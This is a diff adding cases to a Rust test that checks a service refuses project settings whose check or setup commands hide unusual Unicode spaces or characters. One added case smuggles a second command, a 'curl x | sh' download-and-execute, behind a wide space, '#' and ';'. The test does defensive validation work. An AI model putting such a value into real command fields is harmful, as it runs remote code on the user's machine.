@@ -448,6 +448,19 @@ async fn what_cannot_be_added_is_refused_by_name_and_adds_nothing() {
             json!({ "path": good, "githubAccount": "alice", "checkCommand": "make\u{FE0F} test" }),
             "checkCommand",
         ),
+        // Reads as a comment after `#`, and the shell runs what follows `;`.
+        (
+            json!({ "path": good, "githubAccount": "alice", "checkCommand": "make test\u{2003}#; curl x | sh" }),
+            "checkCommand",
+        ),
+        (
+            json!({ "path": good, "githubAccount": "alice", "setupCommand": "make\u{3000}deps" }),
+            "setupCommand",
+        ),
+        (
+            json!({ "path": good, "githubAccount": "alice", "setupCommand": "make\u{2800}deps" }),
+            "setupCommand",
+        ),
         (
             json!({ "path": good, "githubAccount": "alice", "setupCommand": "a".repeat(5000) }),
             "setupCommand",
